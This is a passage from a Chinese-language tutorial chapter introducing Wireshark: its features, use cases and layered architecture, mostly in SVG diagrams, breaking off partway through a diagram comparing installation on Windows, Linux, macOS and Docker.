# 第五章：Wireshark - 网络协议分析

## 5.1 Wireshark 简介与应用场景

```svg
<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1080 560" width="1080" height="560" style="max-width:100%;background:linear-gradient(180deg,#020617 0%,#0f172a 100%);border-radius:14px;border:1px solid #1e293b">
  <defs>
    <linearGradient id="g1s01" x1="0" x2="1" y1="0" y2="0"><stop offset="0" stop-color="#6366f1"/><stop offset="1" stop-color="#06b6d4"/></linearGradient>
    <linearGradient id="g2s01" x1="0" x2="0" y1="0" y2="1"><stop offset="0" stop-color="#1e293b"/><stop offset="1" stop-color="#020617"/></linearGradient>
    <marker id="arrs01" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="7" markerHeight="7" orient="auto-start-reverse"><path d="M 0 0 L 10 5 L 0 10 z" fill="#60a5fa"/></marker>
    <filter id="shs01"><feDropShadow dx="0" dy="2" stdDeviation="3" flood-color="#000" flood-opacity="0.55"/></filter>
  </defs>
  <rect x="0" y="0" width="1080" height="64" fill="url(#g1s01)" opacity="0.3"/>
  <rect x="0" y="0" width="1080" height="2" fill="url(#g1s01)"/>
  <rect x="0" y="60" width="1080" height="2" fill="#1e293b"/>  <text x="540" y="36" text-anchor="middle" font-size="20" font-weight="800" fill="#f1f5f9" font-family="Microsoft YaHei,Arial" filter="url(#shs01)">图 5-1 Wireshark 全球最流行网络协议分析器 + 8 大核心能力一览</text>  <text x="540" y="56" text-anchor="middle" font-size="12" fill="#94a3b8" font-family="Microsoft YaHei,Arial">1998 年 Gerald Combs 启动 Ethereal → 2006 改名 Wireshark → 支持 3000+ 协议 = 网络工程师/安全研究员人手必备</text>  <rect x="30" y="100" width="250" height="195" rx="12" fill="#0b1530" stroke="#0ea5e9" filter="url(#sh)"/>  <rect x="30" y="100" width="250" height="30" rx="12" fill="#0ea5e9" opacity="0.18"/>  <rect x="30" y="100" width="250" height="30" rx="12" fill="none" stroke="#0ea5e9"/>  <text x="44" y="120" font-size="12" font-weight="800" fill="#0ea5e9" font-family="Microsoft YaHei,Arial">① 实时抓包 Live Capture</text>  <text x="44" y="148" font-size="10.2" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">WinPcap/Npcap/ libpcap</text>  <text x="44" y="163" font-size="10.2" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">网卡驱动层抓包=0 丢包</text>  <rect x="290" y="100" width="250" height="195" rx="12" fill="#0b1530" stroke="#10b981" filter="url(#sh)"/>  <rect x="290" y="100" width="250" height="30" rx="12" fill="#10b981" opacity="0.18"/>  <rect x="290" y="100" width="250" height="30" rx="12" fill="none" stroke="#10b981"/>  <text x="304" y="120" font-size="12" font-weight="800" fill="#10b981" font-family="Microsoft YaHei,Arial">② 3000+ 协议深度解析</text>  <text x="304" y="148" font-size="10.2" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">TCP/UDP/HTTP/2/TLS 1.3</text>  <text x="304" y="163" font-size="10.2" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">QUIC/gRPC/SMB/RDP/MySQL 全解</text>  <rect x="550" y="100" width="250" height="195" rx="12" fill="#0b1530" stroke="#8b5cf6" filter="url(#sh)"/>  <rect x="550" y="100" width="250" height="30" rx="12" fill="#8b5cf6" opacity="0.18"/>  <rect x="550" y="100" width="250" height="30" rx="12" fill="none" stroke="#8b5cf6"/>  <text x="564" y="120" font-size="12" font-weight="800" fill="#8b5cf6" font-family="Microsoft YaHei,Arial">③ 双过滤器（捕获+显示）</text>  <text x="564" y="148" font-size="10.2" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">BPF 捕获前过脏数据</text>  <text x="564" y="163" font-size="10.2" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">显示过滤器=任意字段正则/匹配</text>  <rect x="810" y="100" width="250" height="195" rx="12" fill="#0b1530" stroke="#f59e0b" filter="url(#sh)"/>  <rect x="810" y="100" width="250" height="30" rx="12" fill="#f59e0b" opacity="0.18"/>  <rect x="810" y="100" width="250" height="30" rx="12" fill="none" stroke="#f59e0b"/>  <text x="824" y="120" font-size="12" font-weight="800" fill="#f59e0b" font-family="Microsoft YaHei,Arial">④ 流量追踪 Follow Stream</text>  <text x="824" y="148" font-size="10.2" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">TCP/UDP/HTTP/TLS 流还原</text>  <text x="824" y="163" font-size="10.2" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">明文 HTTP 直接看请求/响应</text>  <rect x="30" y="305" width="250" height="195" rx="12" fill="#0b1530" stroke="#ef4444" filter="url(#sh)"/>  <rect x="30" y="305" width="250" height="30" rx="12" fill="#ef4444" opacity="0.18"/>  <rect x="30" y="305" width="250" height="30" rx="12" fill="none" stroke="#ef4444"/>  <text x="44" y="325" font-size="12" font-weight="800" fill="#ef4444" font-family="Microsoft YaHei,Arial">⑤ 强大统计分析 IO Graph</text>  <text x="44" y="353" font-size="10.2" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">会话/端点/协议分级</text>  <text x="44" y="368" font-size="10.2" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">RTT/抖动/带宽 2D 折线图</text>  <rect x="290" y="305" width="250" height="195" rx="12" fill="#0b1530" stroke="#ec4899" filter="url(#sh)"/>  <rect x="290" y="305" width="250" height="30" rx="12" fill="#ec4899" opacity="0.18"/>  <rect x="290" y="305" width="250" height="30" rx="12" fill="none" stroke="#ec4899"/>  <text x="304" y="325" font-size="12" font-weight="800" fill="#ec4899" font-family="Microsoft YaHei,Arial">⑥ HTTPS/TLS 解密</text>  <text x="304" y="353" font-size="10.2" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">(Pre)-Master-Secret 日志</text>  <text x="304" y="368" font-size="10.2" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">RSA 私钥解密 看 HTTPS 明文</text>  <rect x="550" y="305" width="250" height="195" rx="12" fill="#0b1530" stroke="#a855f7" filter="url(#sh)"/>  <rect x="550" y="305" width="250" height="30" rx="12" fill="#a855f7" opacity="0.18"/>  <rect x="550" y="305" width="250" height="30" rx="12" fill="none" stroke="#a855f7"/>  <text x="564" y="325" font-size="12" font-weight="800" fill="#a855f7" font-family="Microsoft YaHei,Arial">⑦ 文件对象导出</text>  <text x="564" y="353" font-size="10.2" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">HTTP/FTP/SMB 导出文件</text>  <text x="564" y="368" font-size="10.2" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">直接从流量里 zip/png/exe 还原</text>  <rect x="810" y="305" width="250" height="195" rx="12" fill="#0b1530" stroke="#06b6d4" filter="url(#sh)"/>  <rect x="810" y="305" width="250" height="30" rx="12" fill="#06b6d4" opacity="0.18"/>  <rect x="810" y="305" width="250" height="30" rx="12" fill="none" stroke="#06b6d4"/>  <text x="824" y="325" font-size="12" font-weight="800" fill="#06b6d4" font-family="Microsoft YaHei,Arial">⑧ 跨平台 + CLI 工具</text>  <text x="824" y="353" font-size="10.2" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">Windows/Linux/macOS 全支持</text>  <text x="824" y="368" font-size="10.2" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">tshark dumpcap editcap 命令行</text>  <rect x="30" y="510" width="1020" height="24" rx="8" fill="#020617" stroke="#1e293b"/>
  <text x="540" y="526" text-anchor="middle" font-size="11" fill="#93c5fd" font-family="Microsoft YaHei,Arial">学习 3 阶段：① 认识界面+过滤器 → ② 掌握 10 大协议分析 → ③ 实战 HTTPS 解密/恶意流量分析=出师</text>
</svg>
```
```svg
<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1080 570" width="1080" height="570" style="max-width:100%;background:linear-gradient(180deg,#020617 0%,#0f172a 100%);border-radius:14px;border:1px solid #1e293b">
  <defs>
    <linearGradient id="g1s02" x1="0" x2="1" y1="0" y2="0"><stop offset="0" stop-color="#6366f1"/><stop offset="1" stop-color="#06b6d4"/></linearGradient>
    <linearGradient id="g2s02" x1="0" x2="0" y1="0" y2="1"><stop offset="0" stop-color="#1e293b"/><stop offset="1" stop-color="#020617"/></linearGradient>
    <marker id="arrs02" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="7" markerHeight="7" orient="auto-start-reverse"><path d="M 0 0 L 10 5 L 0 10 z" fill="#60a5fa"/></marker>
    <filter id="shs02"><feDropShadow dx="0" dy="2" stdDeviation="3" flood-color="#000" flood-opacity="0.55"/></filter>
  </defs>
  <rect x="0" y="0" width="1080" height="64" fill="url(#g1s02)" opacity="0.3"/>
  <rect x="0" y="0" width="1080" height="2" fill="url(#g1s02)"/>
  <rect x="0" y="60" width="1080" height="2" fill="#1e293b"/>  <text x="540" y="36" text-anchor="middle" font-size="20" font-weight="800" fill="#f1f5f9" font-family="Microsoft YaHei,Arial" filter="url(#shs02)">图 5-2 Wireshark 6 大核心应用场景（什么场景必须开 Wireshark？）</text>  <text x="540" y="56" text-anchor="middle" font-size="12" fill="#94a3b8" font-family="Microsoft YaHei,Arial">故障排查/安全分析/协议学习/性能调优 4 大类=学好这 6 个场景=你公司离了你不行</text>  <rect x="30" y="100" width="335" height="205" rx="12" fill="#0b1530" stroke="#0ea5e9" filter="url(#sh)"/>  <rect x="30" y="100" width="335" height="30" rx="12" fill="#0ea5e9" opacity="0.18"/>  <rect x="30" y="100" width="335" height="30" rx="12" fill="none" stroke="#0ea5e9"/>  <text x="44" y="120" font-size="12" font-weight="800" fill="#0ea5e9" font-family="Microsoft YaHei,Arial">① 网络故障排查</text>  <text x="44" y="148" font-size="10.2" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">ping 不通/网速慢/丢包/TCP 重传</text>  <text x="44" y="163" font-size="10.2" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">DNS 解析失败/TLS 握手失败</text>  <text x="44" y="178" font-size="10.2" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">Wireshark=网络世界的 CT 机</text>  <rect x="375" y="100" width="335" height="205" rx="12" fill="#0b1530" stroke="#ef4444" filter="url(#sh)"/>  <rect x="375" y="100" width="335" height="30" rx="12" fill="#ef4444" opacity="0.18"/>  <rect x="375" y="100" width="335" height="30" rx="12" fill="none" stroke="#ef4444"/>  <text x="389" y="120" font-size="12" font-weight="800" fill="#ef4444" font-family="Microsoft YaHei,Arial">② 安全攻击溯源/取证</text>  <text x="389" y="148" font-size="10.2" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">CVE 漏洞利用流量</text>  <text x="389" y="163" font-size="10.2" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">入侵检测 IDS 规则误报验证</text>  <text x="389" y="178" font-size="10.2" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">勒索软件横向 SMB/RDP 流量留痕</text>  <rect x="720" y="100" width="335" height="205" rx="12" fill="#0b1530" stroke="#a855f7" filter="url(#sh)"/>  <rect x="720" y="100" width="335" height="30" rx="12" fill="#a855f7" opacity="0.18"/>  <rect x="720" y="100" width="335" height="30" rx="12" fill="none" stroke="#a855f7"/>  <text x="734" y="120" font-size="12" font-weight="800" fill="#a855f7" font-family="Microsoft YaHei,Arial">③ CTF 网络杂项 Misc</text>  <text x="734" y="148" font-size="10.2" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">USB 流量还原键盘输入</text>  <text x="734" y="163" font-size="10.2" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">无线 WiFi 握手包跑 Aircrack</text>  <text x="734" y="178" font-size="10.2" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">Stego 信息隐藏=图片/音频藏流量</text>  <rect x="30" y="315" width="335" height="205" rx="12" fill="#0b1530" stroke="#8b5cf6" filter="url(#sh)"/>  <rect x="30" y="315" width="335" height="30" rx="12" fill="#8b5cf6" opacity="0.18"/>  <rect x="30" y="315" width="335" height="30" rx="12" fill="none" stroke="#8b5cf6"/>  <text x="44" y="335" font-size="12" font-weight="800" fill="#8b5cf6" font-family="Microsoft YaHei,Arial">④ 协议逆向/开发调试</text>  <text x="44" y="363" font-size="10.2" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">自研协议=先抓包对比字段</text>  <text x="44" y="378" font-size="10.2" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">游戏/APP 私有协议=协议分析</text>  <text x="44" y="393" font-size="10.2" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">WebSocket/gRPC/S7 工控协议</text>  <rect x="375" y="315" width="335" height="205" rx="12" fill="#0b1530" stroke="#f59e0b" filter="url(#sh)"/>  <rect x="375" y="315" width="335" height="30" rx="12" fill="#f59e0b" opacity="0.18"/>  <rect x="375" y="315" width="335" height="30" rx="12" fill="none" stroke="#f59e0b"/>  <text x="389" y="335" font-size="12" font-weight="800" fill="#f59e0b" font-family="Microsoft YaHei,Arial">⑤ 性能优化瓶颈定位</text>  <text x="389" y="363" font-size="10.2" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">RTT/窗口/拥塞控制慢启动</text>  <text x="389" y="378" font-size="10.2" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">TCP Zero Window=对方处理不过来</text>  <text x="389" y="393" font-size="10.2" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">Slow Start=带宽跑不满=升级服务器</text>  <rect x="720" y="315" width="335" height="205" rx="12" fill="#0b1530" stroke="#10b981" filter="url(#sh)"/>  <rect x="720" y="315" width="335" height="30" rx="12" fill="#10b981" opacity="0.18"/>  <rect x="720" y="315" width="335" height="30" rx="12" fill="none" stroke="#10b981"/>  <text x="734" y="335" font-size="12" font-weight="800" fill="#10b981" font-family="Microsoft YaHei,Arial">⑥ 教学/取证/合规审计</text>  <text x="734" y="363" font-size="10.2" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">CCNA/HCIA 网络工程师考证</text>  <text x="734" y="378" font-size="10.2" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">等保 2.0 日志留存 6 个月</text>  <text x="734" y="393" font-size="10.2" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">网安竞赛取证=导出会话留证据</text>
</svg>
```
```svg
<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1080 550" width="1080" height="550" style="max-width:100%;background:linear-gradient(180deg,#020617 0%,#0f172a 100%);border-radius:14px;border:1px solid #1e293b">
  <defs>
    <linearGradient id="g1s03" x1="0" x2="1" y1="0" y2="0"><stop offset="0" stop-color="#6366f1"/><stop offset="1" stop-color="#06b6d4"/></linearGradient>
    <linearGradient id="g2s03" x1="0" x2="0" y1="0" y2="1"><stop offset="0" stop-color="#1e293b"/><stop offset="1" stop-color="#020617"/></linearGradient>
    <marker id="arrs03" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="7" markerHeight="7" orient="auto-start-reverse"><path d="M 0 0 L 10 5 L 0 10 z" fill="#60a5fa"/></marker>
    <filter id="shs03"><feDropShadow dx="0" dy="2" stdDeviation="3" flood-color="#000" flood-opacity="0.55"/></filter>
  </defs>
  <rect x="0" y="0" width="1080" height="64" fill="url(#g1s03)" opacity="0.3"/>
  <rect x="0" y="0" width="1080" height="2" fill="url(#g1s03)"/>
  <rect x="0" y="60" width="1080" height="2" fill="#1e293b"/>  <text x="540" y="36" text-anchor="middle" font-size="20" font-weight="800" fill="#f1f5f9" font-family="Microsoft YaHei,Arial" filter="url(#shs03)">图 5-3 Wireshark 5 层架构原理图（从网卡驱动到你看到的彩色报文列表）</text>  <text x="540" y="56" text-anchor="middle" font-size="12" fill="#94a3b8" font-family="Microsoft YaHei,Arial">上层 UI ↔ 核心引擎 ↔ 捕获驱动 三层解耦；3000+ 协议解析器是 Wireshark 的灵魂</text>  <rect x="80" y="440" width="920" height="80" rx="12" fill="#0b1530" stroke="#0ea5e9"/>  <rect x="80" y="440" width="100" height="80" rx="12" fill="#0ea5e9" opacity="0.22"/>  <text x="130" y="484.0" text-anchor="middle" font-size="12" font-weight="800" fill="#0ea5e9" font-family="Microsoft YaHei,Arial">Layer 1 硬件网卡层</text>  <text x="200" y="468" font-size="10.5" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">物理网卡 (RJ45/WiFi) · 以太网帧收发 · 混杂模式 Promiscuous</text>  <rect x="80" y="350" width="920" height="80" rx="12" fill="#0b1530" stroke="#10b981"/>  <rect x="80" y="350" width="100" height="80" rx="12" fill="#10b981" opacity="0.22"/>  <text x="130" y="394.0" text-anchor="middle" font-size="12" font-weight="800" fill="#10b981" font-family="Microsoft YaHei,Arial">Layer 2 捕获驱动层</text>  <text x="200" y="378" font-size="10.5" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">libpcap (Linux/macOS) / Npcap (Windows) · BPF 过滤 · Ring Buffer · 零拷贝</text>  <rect x="80" y="260" width="920" height="80" rx="12" fill="#0b1530" stroke="#8b5cf6"/>  <rect x="80" y="260" width="100" height="80" rx="12" fill="#8b5cf6" opacity="0.22"/>  <text x="130" y="304.0" text-anchor="middle" font-size="12" font-weight="800" fill="#8b5cf6" font-family="Microsoft YaHei,Arial">Layer 3 Wireshark 核心引擎 (wiretap)</text>  <text x="200" y="288" font-size="10.5" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">pcap/pcapng 读写 · 循环缓冲 · 时间戳校准 · 多文件合并/切割</text>  <rect x="80" y="170" width="920" height="80" rx="12" fill="#0b1530" stroke="#f59e0b"/>  <rect x="80" y="170" width="100" height="80" rx="12" fill="#f59e0b" opacity="0.22"/>  <text x="130" y="214.0" text-anchor="middle" font-size="12" font-weight="800" fill="#f59e0b" font-family="Microsoft YaHei,Arial">Layer 4 3000+ 协议解析器 (dissector)</text>  <text x="200" y="198" font-size="10.5" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">IP/TCP/UDP/HTTP/DNS/TLS/SMB/RDP/... · 插件式可扩展 · Lua/C 都能写自定义解析器</text>  <rect x="80" y="80" width="920" height="80" rx="12" fill="#0b1530" stroke="#ef4444"/>  <rect x="80" y="80" width="100" height="80" rx="12" fill="#ef4444" opacity="0.22"/>  <text x="130" y="124.0" text-anchor="middle" font-size="12" font-weight="800" fill="#ef4444" font-family="Microsoft YaHei,Arial">Layer 5 QT GUI + CLI (tshark)</text>  <text x="200" y="108" font-size="10.5" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">菜单栏/工具栏/过滤器/报文列表/协议树/Hex dump · 颜色规则/IO 图/专家信息</text>  <line x1="540" y1="160" x2="540" y2="80" stroke="#60a5fa" stroke-width="2" marker-end="url(#arr)"/>  <text x="540.0" y="116.0" text-anchor="middle" font-size="10" fill="#60a5fa" font-family="Consolas,Arial">↕ 双向数据流</text>  <line x1="540" y1="160" x2="540" y2="80" stroke="#60a5fa" stroke-width="2" marker-end="url(#arr)"/>  <text x="540.0" y="116.0" text-anchor="middle" font-size="10" fill="#60a5fa" font-family="Consolas,Arial">↕ 双向数据流</text>  <line x1="540" y1="160" x2="540" y2="80" stroke="#60a5fa" stroke-width="2" marker-end="url(#arr)"/>  <text x="540.0" y="116.0" text-anchor="middle" font-size="10" fill="#60a5fa" font-family="Consolas,Arial">↕ 双向数据流</text>  <line x1="540" y1="160" x2="540" y2="80" stroke="#60a5fa" stroke-width="2" marker-end="url(#arr)"/>  <text x="540.0" y="116.0" text-anchor="middle" font-size="10" fill="#60a5fa" font-family="Consolas,Arial">↕ 双向数据流</text>  <rect x="30" y="80" width="40" height="440" rx="10" fill="#020617" stroke="#a855f7" stroke-dasharray="3 2"/>  <text x="50" y="305" text-anchor="middle" font-size="13" font-weight="800" fill="#c4b5fd" font-family="Microsoft YaHei,Arial" transform="rotate(-90 50 305)">Lua 脚本 · C 插件 · 自定义 dissector 扩展</text>  <rect x="1010" y="80" width="40" height="440" rx="10" fill="#020617" stroke="#06b6d4" stroke-dasharray="3 2"/>  <text x="1030" y="305" text-anchor="middle" font-size="13" font-weight="800" fill="#67e8f9" font-family="Microsoft YaHei,Arial" transform="rotate(90 1030 305)">tshark dumpcap editcap capinfos 命令行工具</text>
</svg>
```




### 什么是 Wireshark？

想象你是一个电话接线员，监控着无数的电话通话。你可以听到每一句对话的内容，看到每次通话的时间、时长、参与者等信息。

**Wireshark** 就像一个"网络监听员"，它可以：
- 捕获网络上的所有数据包
- 分析数据包的内容
- 解析各种网络协议
- 找出网络问题
- 发现异常流量

简单来说，Wireshark是**世界上最流行的网络协议分析工具**，被誉为网络工程师和安全分析师的必备工具。

### Wireshark 能做什么？

| 功能 | 说明 | 通俗理解 |
|------|------|----------|
| 数据包捕获 | 捕获网络流量 | 录音所有电话通话 |
| 协议分析 | 解析各种协议 | 翻译通话内容 |
| 流量过滤 | 筛选特定流量 | 只听重要通话 |
| 会话追踪 | 追踪完整会话 | 跟踪完整通话过程 |
| 统计分析 | 统计网络数据 | 分析通话统计 |
| 问题诊断 | 找出网络问题 | 找通话故障 |

### 应用场景

| 场景 | 说明 |
|------|------|
| 网络故障排查 | 找出网络不通的原因 |
| 性能优化 | 分析网络延迟、丢包 |
| 安全分析 | 发现异常流量、攻击 |
| 协议学习 | 学习网络协议原理 |
| 渗透测试 | 分析攻击流量 |
|取证分析 | 分析恶意流量证据 |

---

## 5.2 Windows 系统安装教程

```svg
<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1080 560" width="1080" height="560" style="max-width:100%;background:linear-gradient(180deg,#020617 0%,#0f172a 100%);border-radius:14px;border:1px solid #1e293b">
  <defs>
    <linearGradient id="g1s04" x1="0" x2="1" y1="0" y2="0"><stop offset="0" stop-color="#6366f1"/><stop offset="1" stop-color="#06b6d4"/></linearGradient>
    <linearGradient id="g2s04" x1="0" x2="0" y1="0" y2="1"><stop offset="0" stop-color="#1e293b"/><stop offset="1" stop-color="#020617"/></linearGradient>
    <marker id="arrs04" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="7" markerHeight="7" orient="auto-start-reverse"><path d="M 0 0 L 10 5 L 0 10 z" fill="#60a5fa"/></marker>
    <filter id="shs04"><feDropShadow dx="0" dy="2" stdDeviation="3" flood-color="#000" flood-opacity="0.55"/></filter>
  </defs>
  <rect x="0" y="0" width="1080" height="64" fill="url(#g1s04)" opacity="0.3"/>
  <rect x="0" y="0" width="1080" height="2" fill="url(#g1s04)"/>
  <rect x="0" y="60" width="1080" height="2" fill="#1e293b"/>  <text x="540" y="36" text-anchor="middle" font-size="20" font-weight="800" fill="#f1f5f9" font-family="Microsoft YaHei,Arial" filter="url(#shs04)">图 5-4 Windows/Linux(Kali)/macOS/Docker 4 种安装方式 7 步对比</text>  <text x="540" y="56" text-anchor="middle" font-size="12" fill="#94a3b8" font-family="Microsoft YaHei,Arial">推荐新手：Windows 官网下载 x64.exe + 勾选 Npcap · Kali 自带 Wireshark=开箱即用</text>  <rect x="30" y="100" width="110" height="34" fill="#1e293b" stroke="#6366f1"/>  <text x="85.0" y="122" text-anchor="middle" font-size="11.5" font-weight="800" fill="#bfdbfe" font-family="Microsoft YaHei,Arial">操作系统</text>  <rect x="150" y="100" width="145" height="34" fill="#1e293b" stroke="#6366f1"/>  <text x="222.5" y="122" text-anchor="middle" font-size="11.5" font-weight="800" fill="#bfdbfe" font-family="Microsoft YaHei,Arial">获取渠道</text>  <rect x="305" y="100" width="140" height="34" fill="#1e293b" stroke="#6366f1"/>  <text x="375.0" y="122" text-anchor="middle" font-size="11.5" font-weight="800" fill="#bfdbfe" font-family="Microsoft YaHei,Arial">驱动/依赖</text>  <rect x="455" y="100" width="200" height="34" fill="#1e293b" stroke="#6366f1"/>  <text x="555.0" y="122" text-anchor="middle" font-size="11.5" font-weight="800" fill="#bfdbfe" font-family="Microsoft YaHei,Arial">安装 1 行命令</text>  <rect x="665" y="100" width="150" height="34" fill="#1e293b" stroke="#6366f1"/>  <text x="740.0" y="122" text-anchor="middle" font-size="11.5" font-weight="800" fill="#bfdbfe" font-family="Microsoft YaHei,Arial">安装路径</text>  <rect x="825" y="100" width="100" height="34" fill="#1e293b" stroke="#6366f1"/>  <text x="875.0" y="122" text-anchor="middle" font-size="11.5" font-weight="800" fill="#bfdbfe" font-family="Microsoft YaHei,Arial">启动方式</text>  <rect x="935" y="100" width="115" height="34" fill="#1e293b" stroke="#6366f1"/>  <text x="992.5" y="122" text-anchor="middle" font-size="11.5" font-weight="800" fill="#bfdbfe" font-family="Microsoft YaHei,Arial">必踩坑点</text>  <rect x="30" y="134" width="110" height="72" fill="#111c35" stroke="#334155"/>  <rect x="150" y="134" width="145" height="72" fill="#111c35" stroke="#334155"/>  <rect x="305" y="134" width="140" height="72" fill="#111c35" stroke="#334155"/>  <rect x="455" y="134" width="200" height="72" fill="#111c35" stroke="#334155"/>  <rect x="665" y="134" width="150" height="72" fill="#111c35" stroke="#334155"/>  <rect x="825" y="134" width="100" height="72" fill="#111c35" stroke="#334155"/>  <rect x="935" y="134" width="115" height="72" fill="#111c35" stroke="#334155"/>  <text x="38" y="162" font-size="11.5" font-weight="800" fill="#0ea5e9" font-family="Microsoft YaHei,Arial">Windows 10/11 x64</text>  <text x="156" y="158" font-size="9.5" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">官网 wireshark.org → 下载 x64.ex</text>  <text x="311" y="158" font-size="9.5" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">Npcap 1.79 (勾选 WinPcap 兼容模式)</text>  <text x="461" y="158" font-size="9.5" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">一路 Next + 选安装 USBPcap + 勾选 A</text>  <text x="671" y="158" font-size="9.5" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">C:\Program Files\Wireshark</text>  <text x="831" y="158" font-size="9.5" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">开始菜单 找 Wireshark 图标</text>  <text x="941" y="158" font-size="9.5" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">管理员运行 才能抓包（非管理员抓不到）</text>  <rect x="30" y="206" width="110" height="72" fill="#0b1530" stroke="#334155"/>  <rect x="150" y="206" width="145" height="72" fill="#0b1530" stroke="#334155"/>  <rect x="305" y="206" width="140" height="72" fill="#0b1530" stroke="#334155"/>  <rect x="455" y="206" width="200" height="72" fill="#0b1530" stroke="#334155"/>  <rect x="665" y="206" width="150" height="72" fill="#0b1530" stroke="#334155"/>  <rect x="825" y="206" width="100" height="72" fill="#0b1530" stroke="#334155"/>  <rect x="935" y="206" width="115" height="72" fill="#0b1530" stroke="#334155"/>  <text x="38" y="234" font-size="11.5" font-weight="800" fill="#10b981" font-family="Microsoft YaHei,Arial">Linux Kali / Ubuntu</text>  <text x="156" y="230" font-size="9.5" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">Kali 自带 apt install wireshar</text>  <text x="311" y="230" font-size="9.5" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">libpcap-dev · tshark · dumpc</text>  <text x="461" y="230" font-size="9.5" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">sudo apt update &amp;&amp; sudo apt </text>  <text x="671" y="230" font-size="9.5" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">/usr/bin/wireshark</text>  <text x="831" y="230" font-size="9.5" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">命令行 wireshark 或 应用菜单</text>  <text x="941" y="230" font-size="9.5" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">默认要 sudo 抓包 → sudo usermod -</text>  <rect x="30" y="278" width="110" height="72" fill="#111c35" stroke="#334155"/>  <rect x="150" y="278" width="145" height="72" fill="#111c35" stroke="#334155"/>  <rect x="305" y="278" width="140" height="72" fill="#111c35" stroke="#334155"/>  <rect x="455" y="278" width="200" height="72" fill="#111c35" stroke="#334155"/>  <rect x="665" y="278" width="150" height="72" fill="#111c35" stroke="#334155"/>  <rect x="825" y="278" width="100" height="72" fill="#111c35" stroke="#334155"/>  <rect x="935" y="278" width="115" height="72" fill="#111c35" stroke="#334155"/>  <text x="38" y="306" font-size="11.5" font-weight="800" fill="#8b5cf6" font-family="Microsoft YaHei,Arial">macOS 12+ M1/M2/Intel</text>  <text x="156" y="302" font-size="9.5" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">Homebrew / 官网 .dmg 安装</text>  <text x="311" y="302" font-size="9.5" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">ChmodBPF 开机启动守护进程</text>  <text x="461" y="302" font-size="9.5" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">brew install --cask wireshar</text>  <text x="671" y="302" font-size="9.5" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">/Applications/Wireshark.app</text>  <text x="831" y="302" font-size="9.5" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">启动台/Application 点开</text>  <text x="941" y="302" font-size="9.5" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">需授予 录制屏幕/输入监控 权限（系统设置→隐私→完全磁</text>  <rect x="30" y="350" width="110" height="72" fill="#0b1530" stroke="#334155"/>  <rect x="150" y="350" width="145" height="72" fill="#0b1530" stroke="#334155"/>  <rect x="305" y="350" width="140" height="72" fill="#0b1530" stroke="#334155"/>  <rect x="455" y="350" width="200" height="72" fill="#0b1530" stroke="#334155"/>  <rect x="665" y="350" width="150" height="72" fill="#0b1530" stroke="#334155"/>  <rect x="825" y="350" width="100" height="72" fill="#0b1530" stroke="#334155"/>  <rect x="935" 